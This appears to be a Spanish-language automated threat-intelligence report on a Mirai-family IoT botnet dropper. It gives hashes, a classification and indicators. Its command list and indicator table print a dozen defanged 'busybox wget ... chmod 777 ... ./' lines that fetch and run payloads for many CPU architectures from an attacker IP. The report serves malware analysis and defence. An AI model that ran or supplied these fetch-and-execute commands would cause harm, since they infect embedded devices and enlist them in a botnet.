# 🧬 Payload Analysis

`612474d388a530a1ebbad71458b891c75031ff265019671f09df16930cec7ef8`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 12 comandos observados o extraídos. Se identificaron 25 indicadores técnicos. **Perfil técnico:** `Linux embebido / IoT` (probable). La presencia de BusyBox, junto con la evidencia de familia Mirai, es consistente con malware orientado a sistemas embebidos e IoT. **Ficha malware:** [malware-like/oraculo/botnet/612474d388a530a1ebbad71458b891c75031ff265019671f09df16930cec7ef8.md](../../../../../malware-like/oraculo/botnet/612474d388a530a1ebbad71458b891c75031ff265019671f09df16930cec7ef8.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:48:36.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `612474d388a530a1ebbad71458b891c75031ff265019671f09df16930cec7ef8`
- **SHA1:** `3f42f66ebc68795c001cf074c955540a4a5a36eb`
- **MD5:** `66934efc6cfb1189720d26b5d32715b2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 2.1 KiB |
| Entropía | 5.29 |
| Strings | 22 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; | strings |
| ip | 94.154.43.XXX | static_analysis |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_ | strings |
| hash | 612474d388a530a1ebbad71458b891c75031ff265019671f09df16930cec7ef8 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
